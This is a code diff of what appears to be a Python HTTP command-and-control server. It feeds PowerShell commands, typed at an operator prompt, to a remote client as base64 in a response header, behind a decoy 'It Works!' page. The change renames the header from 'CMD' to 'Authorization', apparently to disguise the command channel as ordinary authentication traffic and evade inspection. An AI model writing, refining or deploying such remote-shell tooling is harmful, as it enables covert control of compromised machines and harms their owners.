@@ -17,7 +17,7 @@ class myHandler(BaseHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         CMD = base64.b64encode(input("PS (AQUI_PWD)>> ").encode())
-        self.send_header('CMD',CMD)
+        self.send_header('Authorization',CMD)
         self.end_headers()
         self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
         return
@@ -45,7 +45,7 @@ class myHandler(BaseHTTPRequestHandler):
 
         command = input("PS {}>> ".format(pwd)) + "; pwd"
         CMD = base64.b64encode(command.encode())
-        self.send_header('CMD',CMD.decode('utf-8'))
+        self.send_header('Authorization',CMD.decode('utf-8'))
         self.end_headers()
         self.wfile.write("<html><body><h1>It Works!</h1></body></html>".encode())
         return
